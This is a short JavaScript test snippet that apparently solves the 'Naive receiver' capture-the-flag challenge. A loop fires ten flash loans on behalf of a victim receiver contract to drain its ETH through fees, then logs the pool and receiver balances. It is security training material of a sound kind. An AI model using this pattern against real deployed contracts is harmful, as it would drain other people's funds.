...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    ...
    const ETH = await pool.ETH();
    for (let i = 0; i < 10; i++) {
      await pool.flashLoan(receiver.address, ETH, 10n * 10n ** 18n, "0x");
    }
    let b = await ethers.provider.getBalance(pool.address);
    console.log("pool eth", b.toString());

    b = await ethers.provider.getBalance(receiver.address);
    console.log("receiver eth", b.toString());
  });
